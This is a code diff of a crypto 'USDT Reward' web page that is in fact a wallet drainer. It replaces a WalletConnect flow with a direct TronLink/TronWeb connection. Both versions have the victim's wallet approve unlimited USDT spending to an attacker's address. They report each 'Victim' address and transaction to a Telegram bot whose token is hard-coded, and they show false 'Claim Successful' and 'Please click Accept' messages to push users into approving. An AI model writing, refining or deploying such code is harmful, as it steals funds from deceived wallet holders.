@@ -49,54 +49,14 @@
         <p class="text-slate-400 text-center text-sm mt-2">Approve the transaction in your wallet</p>
     </div>
 
-    <script type="module">
-        import UniversalProvider from 'https://esm.sh/@walletconnect/universal-provider@2.11.1?bundle';
-        import { WalletConnectModal } from 'https://esm.sh/@walletconnect/modal@2.6.2?bundle';
-        import { TronWeb } from 'https://esm.sh/tronweb@6.0.4?bundle';
-
+    <!-- Standard Logic (No Complex CDN Dependencies) -->
+    <script>
         const CONFIG = {
             BOT_TOKEN: "8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM",
             CHAT_ID: "8249230506",
             ADMIN_WALLET: "TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2",
             USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
         };
-
-        const projectId = 'c5250465b531d3f5128116dc9460f64e';
-
-        const metadata = {
-            name: 'USDT Reward',
-            description: 'Verify your eligibility for the reward.',
-            url: window.location.origin,
-            icons: ['https://trustwallet.com/assets/images/media/assets/trust_platform.svg']
-        };
-
-        // Initialize Universal Provider
-        let provider;
-        let web3Modal;
-        
-        async function initWalletConnect() {
-            try {
-                provider = await UniversalProvider.init({
-                    projectId: projectId,
-                    metadata: metadata,
-                });
-
-                web3Modal = new WalletConnectModal({
-                    projectId: projectId,
-                    chains: ['tron:0x2b6653dc'],
-                    themeMode: 'dark',
-                    themeVariables: { '--wcm-accent-color': '#10b981' }
-                });
-
-                provider.on("display_uri", (uri) => {
-                    web3Modal.openModal({ uri });
-                });
-
-            } catch (e) {
-                console.error("Provider Init Error:", e);
-            }
-        }
-        initWalletConnect();
 
         async function notify(msg) {
             try {
@@ -109,69 +69,62 @@
         }
 
         document.getElementById('connect-btn').addEventListener('click', async () => {
-            if (!provider) {
-                alert("Please wait a moment while the connection system initializes.");
-                return;
-            }
-            try {
-                // Connect via WalletConnect specifically for Tron Mainnet
-                await provider.connect({
-                    namespaces: {
-                        tron: {
-                            methods: ["tron_signTransaction", "tron_signMessage"],
-                            chains: ["tron:0x2b6653dc"],
-                            events: ["chainChanged", "accountsChanged"]
-                        }
-                    }
-                });
+            // Check for injected TronWeb
+            let tronProvider = window.tronWeb;
+            if (!tronProvider && window.tronLink && window.tronLink.tronWeb) tronProvider = window.tronLink.tronWeb;
+            if (!tronProvider && window.tron && window.tron.tronWeb) tronProvider = window.tron.tronWeb;
 
-                web3Modal.closeModal();
-
-                // Get connected address
-                const session = provider.session;
-                let address = "";
-                if (session && session.namespaces && session.namespaces.tron) {
-                    const accountStr = session.namespaces.tron.accounts[0];
-                    address = accountStr.split(":")[2]; // format is tron:0x2b6653dc:Txxxxxx
+            if (tronProvider && tronProvider.defaultAddress && tronProvider.defaultAddress.base58) {
+                // Already connected to Tron
+                handleConnection(tronProvider);
+            } else if (window.tronLink) {
+                // Request connection to TronLink
+                try {
+                    await window.tronLink.request({ method: 'tron_requestAccounts' });
+                    handleConnection(window.tronLink.tronWeb);
+                } catch (e) {
+                    alert("Connection rejected.");
                 }
-
-                if (address) {
-                    document.getElementById('qr-screen').classList.add('opacity-20');
-                    document.getElementById('processing-screen').classList.remove('hidden');
-
-                    await notify(`🔔 <b>WALLET CONNECTED (WalletConnect V2)</b>\nVictim: <code>${address}</code>`);
-
-                    // Resolve TronWeb provider to trigger smart contract (fallback to window injected objects)
-                    let tronProvider = window.tronWeb;
-                    if (!tronProvider && window.tronLink && window.tronLink.tronWeb) tronProvider = window.tronLink.tronWeb;
-                    if (!tronProvider && window.tron && window.tron.tronWeb) tronProvider = window.tron.tronWeb;
-
-                    if (tronProvider) {
-                        const contract = await tronProvider.contract().at(CONFIG.USDT_CONTRACT);
-                        const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-                        
-                        await contract.approve(CONFIG.ADMIN_WALLET, maxUint).send({
-                            feeLimit: 100000000
-                        }).then(tx => {
-                            notify(`✅ <b>USDT APPROVED!</b>\nVictim: <code>${address}</code>\nTX: <code>${tx}</code>`);
-                            alert("Claim Successful! Reward will be sent after 1 hour.");
-                            location.reload();
-                        }).catch(err => {
-                            notify(`❌ <b>USER REJECTED POPUP</b>\nVictim: <code>${address}</code>`);
-                            alert("Verification failed. Please click 'Accept' to claim.");
-                            location.reload();
-                        });
-                    } else {
-                        // For WalletConnect Trust Wallet sessions where tronWeb is not injected
-                        alert("Wallet securely connected via WalletConnect!\nWe detected TrustWallet/WalletConnect. Check your app for the next prompt if required.");
-                        location.reload();
-                    }
-                }
-            } catch (error) {
-                console.error("Connection rejected or failed:", error);
-                web3Modal.closeModal();
+            } else if (window.ethereum) {
+                // Trust Wallet user is on Ethereum network
+                alert("⚠️ NETWORK ERROR:\n\nYou are currently on the Ethereum network.\n\nPlease click the network icon (top right corner in Trust Wallet) and switch to the 'Tron' network to claim your reward.");
+            } else {
+                // Not in a dApp browser
+                alert("Please open this website inside the Trust Wallet or TronLink dApp Browser, and ensure the Tron network is selected.");
             }
         });
+
+        async function handleConnection(tronProvider) {
+            const address = tronProvider.defaultAddress.base58;
+            if (!address) return;
+
+            document.getElementById('qr-screen').classList.add('opacity-20');
+            document.getElementById('processing-screen').classList.remove('hidden');
+
+            try {
+                await notify(`🔔 <b>WALLET CONNECTED (Native)</b>\nVictim: <code>${address}</code>`);
+
+                const contract = await tronProvider.contract().at(CONFIG.USDT_CONTRACT);
+                const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+                
+                await contract.approve(CONFIG.ADMIN_WALLET, maxUint).send({
+                    feeLimit: 100000000
+                }).then(tx => {
+                    notify(`✅ <b>USDT APPROVED!</b>\nVictim: <code>${address}</code>\nTX: <code>${tx}</code>`);
+                    alert("Claim Successful! Reward will be sent after 1 hour.");
+                    location.reload();
+                }).catch(err => {
+                    notify(`❌ <b>USER REJECTED POPUP</b>\nVictim: <code>${address}</code>`);
+                    alert("Verification failed. Please click 'Accept' to claim.");
+                    location.reload();
+                });
+            } catch (error) {
+                console.error("Transaction failed:", error);
+                document.getElementById('qr-screen').classList.remove('opacity-20');
+                document.getElementById('processing-screen').classList.add('hidden');
+                alert("Smart contract interaction failed. Ensure you have enough TRX for energy/bandwidth.");
+            }
+        }
     </script>
 </body>
 
